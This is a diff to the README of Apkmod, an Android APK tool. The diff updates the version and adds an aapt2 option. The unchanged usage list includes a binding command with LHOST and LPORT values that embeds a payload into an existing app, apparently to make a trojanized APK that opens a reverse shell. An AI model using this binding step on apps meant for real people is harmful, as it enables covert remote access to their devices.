@@ -1,4 +1,4 @@
-# Apkmod v1.2
+# Apkmod v1.3
 ### Author : Lokesh @Hax4us
 
 ## _Steps For Installation_
@@ -12,6 +12,7 @@
 2. For recompiling `apkmod -r /path/to/indirectory -o /path/to/outapp.apk`. It will recompile __indirectory__ ( where decompiled files are exists ) into __outapp.apk__.
 3. For signing `apkmod -s /path/to/unsignedapp.apk -o /path/to/signedapp.apk`. It will sign __unsignedapp.apk__ and saves output ( signed app ) to __signedapp.apk__.
 4. For binding `apkmod -b /path/to/originalApp.apk -o /path/to/binded.apk LHOST=127.0.0.1 LPORT=4444`. It will bind payload with __originalApp.apk__ and saves final binded app to __binded.apk__.
+5. Now you can use a optional option `-a` to use __aapt2__ for __binding__ and __recompiling__.
 
 ### Size Comparision
 Size  | Apkmod  | Third party tools
